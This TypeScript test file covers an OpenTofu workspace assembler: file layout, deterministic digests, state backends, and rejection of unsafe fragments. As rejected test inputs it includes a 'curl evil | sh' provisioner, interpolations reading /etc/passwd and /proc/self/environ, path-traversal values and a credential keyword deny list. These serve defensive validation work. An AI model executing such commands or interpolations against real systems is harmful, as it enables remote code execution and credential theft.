import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { sha256Hex } from "@/lib/controlplane/digest";
import type { TofuFragment } from "@/lib/drivers/types";
import { isSafeRelativePath } from "@/lib/tofu/config-digest";
import { PROVIDER_PINS } from "@/lib/tofu/providers";
import { stableJson } from "@/lib/tofu/stable";
import { TOFU_VERSION } from "@/lib/tofu/types";
import { assembleWorkspace, assertWorkspaceIntact, configDigestOf, lockDigestOf, TofuWorkspaceError, type AssembleWorkspaceInput } from "@/lib/tofu/workspace";
import { dataFragment, graphOf, node } from "./_helpers";

const file = (ws: ReturnType<typeof assembleWorkspace>, p: string) => JSON.parse(ws.files.find((f) => f.path === p)!.content);

function input(over: Partial<AssembleWorkspaceInput> = {}): AssembleWorkspaceInput {
  const fragments = new Map<string, TofuFragment>([
    [
      "resource/db",
      {
        resource: { aws_db_instance: { db: { identifier: "acme", engine: "postgres" } }, random_id: { suffix: { byte_length: 4 } } },
        output: { db_endpoint: { value: "${aws_db_instance.db.endpoint}" } },
        addresses: ["aws_db_instance.db", "random_id.suffix"],
      },
    ],
    ["service/web", { resource: { aws_ecs_service: { web: { name: "web" } } }, data: { aws_caller_identity: { me: {} } }, addresses: ["aws_ecs_service.web", "data.aws_caller_identity.me"] }],
  ]);
  return {
    graph: graphOf([node("resource/db"), node("service/web")]),
    fragments,
    providerSet: "aws",
    region: "ap-south-1",
    backend: { kind: "s3", bucket: "acme-zenith-state", region: "ap-south-1" },
    stateKey: "zenith/ws1/env1/terraform.tfstate",
    tags: { "zenith:workspace": "ws1", "zenith:environment": "env1" },
    ...over,
  };
}

describe("assembleWorkspace: files", () => {
  it("writes versions, providers, backend and main with pins, region and tags but no credentials", () => {
    const ws = assembleWorkspace(input());
    expect(ws.files.map((f) => f.path)).toEqual(["backend.tf.json", "main.tf.json", "providers.tf.json", "versions.tf.json"]);

    const versions = file(ws, "versions.tf.json");
    expect(versions.terraform.required_version).toBe(`= ${TOFU_VERSION}`);
    expect(versions.terraform.required_providers.aws).toEqual({ source: "hashicorp/aws", version: `= ${PROVIDER_PINS.aws.version}` });
    expect(versions.terraform.required_providers.random.version).toBe(`= ${PROVIDER_PINS.random.version}`);

    const providers = file(ws, "providers.tf.json");
    expect(providers.provider.aws.region).toBe("ap-south-1");
    expect(providers.provider.aws.default_tags.tags).toEqual({ "zenith:environment": "env1", "zenith:workspace": "ws1" });
    const flat = ws.files.map((f) => f.content).join("\n");
    for (const forbidden of ["access_key", "secret_key", "token", "endpoints", "skip_credentials_validation", "AKIA"]) {
      expect(flat, forbidden).not.toContain(forbidden);
    }

    const main = file(ws, "main.tf.json");
    expect(Object.keys(main)).toEqual(["data", "output", "resource"]);
    expect(main.resource.aws_ecs_service.web.name).toBe("web");
    expect(ws.backend).toBe("s3");
    expect(ws.addressMap).toEqual({
      "resource/db": ["aws_db_instance.db", "random_id.suffix"],
      "service/web": ["aws_ecs_service.web", "data.aws_caller_identity.me"],
    });
  });

  it("uses 2-space indented JSON with sorted keys and a trailing newline", () => {
    const ws = assembleWorkspace(input());
    const main = ws.files.find((f) => f.path === "main.tf.json")!.content;
    expect(main.endsWith("}\n")).toBe(true);
    expect(main).toContain('\n  "data": {\n    "aws_caller_identity"');
    const parsed = JSON.parse(main);
    expect(stableJson(parsed)).toBe(main);
  });

  it("is deterministic: fragment insertion order does not change any byte or digest", () => {
    const a = assembleWorkspace(input());
    const base = input();
    const reversed = new Map([...base.fragments.entries()].reverse());
    const b = assembleWorkspace({ ...base, fragments: reversed });
    expect(b.files).toEqual(a.files);
    expect(b.configDigest).toBe(a.configDigest);
    expect(b.lockDigest).toBe(a.lockDigest);
    expect(b.addressMap).toEqual(a.addressMap);
  });

  it("changes configDigest when a change changes, and lockDigest is the lockfile's sha256", () => {
    const a = assembleWorkspace(input());
    const base = input();
    base.fragments.set("service/web", { resource: { aws_ecs_service: { web: { name: "web2" } } }, addresses: ["aws_ecs_service.web"] });
    const b = assembleWorkspace(base);
    expect(b.configDigest).not.toBe(a.configDigest);
    expect(a.lockDigest).toBe(sha256Hex(a.lockfile));
    expect(b.lockDigest).toBe(a.lockDigest);
    expect(a.lockfile).toContain('provider "registry.opentofu.org/hashicorp/aws"');
  });

  it("pins the region and tags into the digest", () => {
    const a = assembleWorkspace(input());
    expect(assembleWorkspace(input({ region: "eu-west-1" })).configDigest).not.toBe(a.configDigest);
    expect(assembleWorkspace(input({ tags: { "zenith:workspace": "other" } })).configDigest).not.toBe(a.configDigest);
  });
});

describe("assembleWorkspace: backends", () => {
  it("s3: native lockfile, encryption, no dynamodb, no credentials", () => {
    const ws = assembleWorkspace(input());
    const b = file(ws, "backend.tf.json").terraform;
    expect(b.backend.s3).toEqual({
      bucket: "acme-zenith-state",
      key: "zenith/ws1/env1/terraform.tfstate",
      region: "ap-south-1",
      encrypt: true,
      use_lockfile: true,
    });
    expect(b.encryption).toBeUndefined();
  });

  it("s3 with a KMS key adds enforced client-side state and plan encryption (aws_kms + aes_gcm)", () => {
    const arn = "arn:aws:kms:ap-south-1:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab";
    const ws = assembleWorkspace(input({ backend: { kind: "s3", bucket: "acme-zenith-state", encryptionKmsKeyArn: arn, sseKmsKeyId: arn } }));
    const t = file(ws, "backend.tf.json").terraform;
    expect(t.backend.s3.kms_key_id).toBe(arn);
    expect(t.encryption.key_provider.aws_kms.zenith).toEqual({ kms_key_id: arn, region: "ap-south-1", key_spec: "AES_256" });
    expect(t.encryption.method.aes_gcm.zenith.keys).toBe("key_provider.aws_kms.zenith");
    expect(t.encryption.state).toEqual({ method: "method.aes_gcm.zenith", enforced: true });
    expect(t.encryption.plan).toEqual({ method: "method.aes_gcm.zenith", enforced: true });
  });

  it("rejects malformed bucket, key, region and KMS values", () => {
    expect(() => assembleWorkspace(input({ backend: { kind: "s3", bucket: "Bad_Bucket" } }))).toThrow(/bucket/);
    expect(() => assembleWorkspace(input({ stateKey: "../escape" }))).toThrow(/stateKey/);
    expect(() => assembleWorkspace(input({ stateKey: undefined }))).toThrow(/stateKey/);
    expect(() => assembleWorkspace(input({ stateKey: "/abs" }))).toThrow(/stateKey/);
    expect(() => assembleWorkspace(input({ region: "Not A Region" }))).toThrow(/region/i);
    expect(() => assembleWorkspace(input({ backend: { kind: "s3", bucket: "acme-zenith-state", encryptionKmsKeyArn: "not-an-arn" } }))).toThrow(/ARN/);
  });

  it("local backend defaults to terraform.tfstate; http backend must be https without embedded credentials", () => {
    const local = assembleWorkspace(input({ backend: { kind: "local" } }));
    expect(local.backend).toBe("local");
    expect(file(local, "backend.tf.json").terraform.backend.local.path).toBe("terraform.tfstate");
    const http = assembleWorkspace(input({ backend: { kind: "http", address: "https://state.example.com/s/1" } }));
    expect(http.backend).toBe("http");
    expect(() => assembleWorkspace(input({ backend: { kind: "http", address: "https://user:pw@state.example.com/s" } }))).toThrow(/credentials/);
    expect(() => assembleWorkspace(input({ backend: { kind: "http", address: "http://state.example.com/s" } }))).toThrow(/https/);
  });
});

describe("assembleWorkspace: fragment validation", () => {
  const expectCode = (fn: () => unknown, code: TofuWorkspaceError["code"]) => {
    try {
      fn();
    } catch (e) {
      expect(e).toBeInstanceOf(TofuWorkspaceError);
      expect((e as TofuWorkspaceError).code).toBe(code);
      return;
    }
    throw new Error(`expected ${code}`);
  };

  it("rejects the same resource address defined by two fragments", () => {
    const base = input();
    base.fragments.set("service/web", { resource: { aws_db_instance: { db: {} } }, addresses: ["aws_db_instance.db"] });
    expectCode(() => assembleWorkspace(base), "duplicate_address");
  });

  it("rejects duplicate data, output and local names across fragments", () => {
    const graph = graphOf([node("a"), node("b")]);
    const cases: [TofuFragment, TofuFragment][] = [
      [
        { data: { aws_caller_identity: { me: {} } }, addresses: ["data.aws_caller_identity.me"] },
        { data: { aws_caller_identity: { me: {} } }, addresses: [] },
      ],
      [
        { output: { shared: { value: 1 } }, addresses: [] },
        { output: { shared: { value: 2 } }, addresses: [] },
      ],
      [
        { locals: { shared: 1 }, addresses: [] },
        { locals: { shared: 2 }, addresses: [] },
      ],
    ];
    for (const [a, b] of cases) {
      expectCode(
        () => assembleWorkspace({ ...input(), graph, fragments: new Map([["a", a], ["b", b]]) }),
        "duplicate_address"
      );
    }
  });

  it("rejects a claimed address the fragment does not define", () => {
    const base = input();
    base.fragments.set("service/web", { resource: { aws_ecs_service: { web: {} } }, addresses: ["aws_ecs_service.web", "aws_ecs_service.ghost"] });
    expectCode(() => assembleWorkspace(base), "invalid_fragment");
  });

  it("rejects fragments for unknown nodes", () => {
    const base = input();
    base.fragments.set("service/ghost", { resource: { aws_ecs_service: { ghost: {} } }, addresses: ["aws_ecs_service.ghost"] });
    expectCode(() => assembleWorkspace(base), "unknown_node");
  });

  it("only lets referenced and external nodes read data, never declare resources", () => {
    const graph = graphOf([node("network/existing", { ownership: "referenced" })]);
    const ok = new Map<string, TofuFragment>([["network/existing", { data: { aws_vpc: { existing: { id: "vpc-1" } } }, addresses: ["data.aws_vpc.existing"] }]]);
    expect(() => assembleWorkspace({ ...input(), graph, fragments: ok })).not.toThrow();
    const bad = new Map<string, TofuFragment>([["network/existing", { resource: { aws_vpc: { existing: {} } }, addresses: ["aws_vpc.existing"] }]]);
    expectCode(() => assembleWorkspace({ ...input(), graph, fragments: bad }), "invalid_fragment");
  });

  it("rejects resource types outside the provider set", () => {
    const graph = graphOf([node("resource/db")]);
    const f = new Map<string, TofuFragment>([["resource/db", { resource: { google_sql_database_instance: { db: {} } }, addresses: ["google_sql_database_instance.db"] }]]);
    expectCode(() => assembleWorkspace({ ...input(), graph, fragments: f }), "invalid_fragment");
    // an implied provider outside the lockfile (null, external, local…) is rejected up front
    for (const type of ["null_resource", "external", "local_file", "http"]) {
      const g = new Map<string, TofuFragment>([["resource/db", { data: { [type]: { x: {} } }, addresses: [`data.${type}.x`] }]]);
      expectCode(() => assembleWorkspace({ ...input(), graph, fragments: g }), "invalid_fragment");
    }
  });

  it("rejects provisioners, connection blocks and remote state", () => {
    const graph = graphOf([node("resource/db")]);
    for (const body of [{ provisioner: [{ "local-exec": { command: "curl evil | sh" } }] }, { connection: { host: "x" } }]) {
      const f = new Map<string, TofuFragment>([["resource/db", { resource: { terraform_data: { x: body } }, addresses: ["terraform_data.x"] }]]);
      expectCode(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: f }), "forbidden_construct");
    }
    const rs = new Map<string, TofuFragment>([["resource/db", { data: { terraform_remote_state: { x: {} } }, addresses: ["data.terraform_remote_state.x"] }]]);
    expectCode(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: rs }), "forbidden_construct");
  });

  it("refuses interpolations that read the runner's files, paths or workspace", () => {
    const graph = graphOf([node("resource/db")]);
    for (const evil of [
      '${file("/proc/self/environ")}',
      '${filebase64("/etc/passwd")}',
      '${templatefile("/x", {})}',
      '${jsonencode(fileexists("/x"))}',
      "${path.cwd}",
      "${path.module}/../secret",
      "${terraform.workspace}",
    ]) {
      const f = new Map<string, TofuFragment>([["resource/db", dataFragment("x", { tag: evil })]]);
      expectCode(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: f }), "forbidden_construct");
    }
    // a plain string that merely mentions "file(" without an interpolation is data
    const fine = new Map<string, TofuFragment>([["resource/db", dataFragment("x", { note: "my-file(1) and profile(x)" })]]);
    expect(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: fine })).not.toThrow();
    // resource references and safe functions pass
    const refs = new Map<string, TofuFragment>([["resource/db", dataFragment("x", { v: '${join(",", [terraform_data.y.id])}' })]]);
    expect(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: refs })).not.toThrow();
  });

  it("rejects fragments with unknown top-level keys (providers, backends, terraform)", () => {
    const base = input();
    base.fragments.set("service/web", { resource: { aws_ecs_service: { web: {} } }, addresses: ["aws_ecs_service.web"], provider: { aws: { access_key: "x" } } } as unknown as TofuFragment);
    expectCode(() => assembleWorkspace(base), "invalid_fragment");
  });

  it("rejects invalid block labels", () => {
    const graph = graphOf([node("resource/db")]);
    const f = new Map<string, TofuFragment>([["resource/db", { resource: { terraform_data: { 'a"b': {} } }, addresses: [] }]]);
    expectCode(() => assembleWorkspace({ ...input(), providerSet: "builtin", graph, fragments: f }), "invalid_fragment");
  });

  it("rejects credential-shaped provider config", () => {
    expectCode(() => assembleWorkspace(input({ providerConfig: { aws: { access_key: "AKIAABCDEFGHIJKLMNOP" } } })), "forbidden_construct");
    expectCode(() => assembleWorkspace(input({ providerConfig: { aws: { assume_role: [{ role_arn: "arn:x", external_id: "x", session_token: "y" }] } } })), "forbidden_construct");
    expectCode(() => assembleWorkspace(input({ providerSet: "gcp", fragments: new Map(), providerConfig: { google: { credentials: "{...}" } } })), "forbidden_construct");
    expect(() => assembleWorkspace(input({ providerSet: "gcp", fragments: new Map(), providerConfig: { google: { project: "acme-prod" } } }))).not.toThrow();
  });

  it("emits per-cloud provider blocks with region and non-secret config only", () => {
    const gcp = assembleWorkspace(input({ providerSet: "gcp", fragments: new Map(), providerConfig: { google: { project: "acme-prod" } } }));
    expect(file(gcp, "providers.tf.json").provider.google).toEqual({ project: "acme-prod", region: "ap-south-1" });
    const az = assembleWorkspace(input({ providerSet: "azure", fragments: new Map(), providerConfig: { azurerm: { subscription_id: "0000" } } }));
    expect(file(az, "providers.tf.json").provider.azurerm).toEqual({ features: {}, subscription_id: "0000" });
    const k8s = assembleWorkspace(input({ providerSet: "kubernetes", fragments: new Map() }));
    expect(file(k8s, "providers.tf.json")).toEqual({});
  });

  it("builtin workspaces need no providers or lock hashes", () => {
    const ws = assembleWorkspace(input({ providerSet: "builtin", fragments: new Map() }));
    expect(file(ws, "versions.tf.json").terraform.required_providers).toBeUndefined();
    expect(ws.lockfile).not.toContain("hashes");
  });

  it("rejects an unknown provider set", () => {
    expectCode(() => assembleWorkspace(input({ providerSet: "nope" as never })), "unknown_provider_set");
  });
});

describe("assertWorkspaceIntact", () => {
  it("passes for an assembled workspace and fails when bytes, lockfile or paths are tampered", () => {
    const ws = assembleWorkspace(input());
    expect(() => assertWorkspaceIntact(ws)).not.toThrow();
    const tampered = { ...ws, files: ws.files.map((f) => (f.path === "main.tf.json" ? { ...f, content: f.content.replace("web", "evil") } : f)) };
    expect(() => assertWorkspaceIntact(tampered)).toThrow(/configDigest/);
    expect(() => assertWorkspaceIntact({ ...ws, lockfile: `${ws.lockfile}# edit\n` })).toThrow(/lockDigest/);
    expect(() => assertWorkspaceIntact({ ...ws, files: [...ws.files, { path: "../evil.tf", content: "" }] })).toThrow(/Unsafe/);
    expect(() => assertWorkspaceIntact({ ...ws, files: [...ws.files, ws.files[0]] })).toThrow(/Duplicate/);
    expect(() => assertWorkspaceIntact({ ...ws, files: [...ws.files, { path: ".terraform.lock.hcl", content: "" }] })).toThrow(/Unsafe/);
  });
});

describe("isSafeRelativePath", () => {
  it("accepts plain relative ASCII paths and rejects escapes", () => {
    for (const ok of ["main.tf.json", "modules/a/b.tf.json", "a-b_c.d"]) expect(isSafeRelativePath(ok), ok).toBe(true);
    for (const bad of ["", "/abs", "../x", "a/../b", "a//b", "a\\b", "C:/x", ".terraform.lock.hcl", ".terraform/x", "é.tf", "a b", "a/./b", "x".repeat(201)]) {
      expect(isSafeRelativePath(bad), bad).toBe(false);
    }
  });
});

describe("configDigest golden vector (shared with the Go runner)", () => {
  const vector = JSON.parse(readFileSync(path.resolve(__dirname, "fixtures/config-digest-vector.json"), "utf8")) as {
    vectors: { name: string; files: { path: string; content: string; contentB64: string }[]; configDigest: string }[];
    lock: { lockfile: string; lockDigest: string };
  };

  it("matches every vector, regardless of input order", () => {
    expect(vector.vectors.length).toBeGreaterThanOrEqual(4);
    for (const v of vector.vectors) {
      const files = v.files.map((f) => ({ path: f.path, content: f.content }));
      expect(configDigestOf(files), v.name).toBe(v.configDigest);
      expect(configDigestOf([...files].reverse()), `${v.name} reversed`).toBe(v.configDigest);
      // contentB64 (what a tofu.run payload carries) decodes to the same content
      for (const f of v.files) expect(Buffer.from(f.contentB64, "base64").toString("utf8")).toBe(f.content);
    }
  });

  it("implements the documented rule literally: sha256 over path NUL sha256(content) LF, sorted by path", () => {
    const files = [
      { path: "b.tf.json", content: "B" },
      { path: "a.tf.json", content: "A" },
    ];
    const line = (p: string, c: string) => `${p}\0${sha256Hex(c)}\n`;
    expect(configDigestOf(files)).toBe(sha256Hex(line("a.tf.json", "A") + line("b.tf.json", "B")));
  });

  it("hashes the lockfile bytes for lockDigest", () => {
    expect(lockDigestOf(vector.lock.lockfile)).toBe(vector.lock.lockDigest);
  });

  it("excludes the lockfile: workspace configDigest ignores lockfile content", () => {
    const ws = assembleWorkspace(input());
    expect(configDigestOf(ws.files)).toBe(ws.configDigest);
    expect(ws.files.some((f) => f.path.endsWith("lock.hcl"))).toBe(false);
  });
});
